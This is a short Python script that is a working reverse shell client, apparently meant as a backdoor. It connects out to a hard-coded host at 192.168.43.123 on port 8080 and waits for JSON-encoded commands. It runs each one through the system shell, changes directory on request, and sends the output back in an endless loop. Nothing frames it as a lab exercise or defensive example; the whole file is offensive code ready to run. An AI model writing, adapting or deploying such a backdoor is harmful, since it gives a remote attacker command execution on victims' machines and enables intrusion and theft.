import socket,subprocess,json,os
connection= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("192.168.43.123",8080))
print("connecting .......")

def recv_command():
    json_data = connection.recv(1024).decode()
    command = json.loads(json_data)
    return command

def execute_system_command(command):
    command_result = subprocess.run(command , shell=True, capture_output=True)
    command_res = json.dumps(command_result.stdout.decode())
    return (command_res)

def send_result(command_res):
    connection.send(command_res.encode())

def recv_data():
    json_data = connection.recv(1024).decode()
    command = json.loads(json_data)
    return command

while True:
    try:
        command = recv_command()

        if command[0]=="cd" and len(command)>1:
            os.chdir(command[1])
            send_result("done")

        else:
            command_res = execute_system_command(command)
            send_result(command_res)

    except KeyboardInterrupt:
        connection.close()

